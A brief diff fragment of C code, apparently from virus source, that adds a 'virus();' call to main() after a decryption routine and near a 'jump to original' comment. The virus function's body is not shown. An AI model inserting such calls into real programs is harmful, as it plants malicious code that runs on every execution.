@@ -14,6 +14,7 @@ int main(void)
 	{
 		decrypt(0,2,0,0,0);
 		//write(1,"\n",1);
+		virus();
 		exit (0);
 	}
 	//jump to original
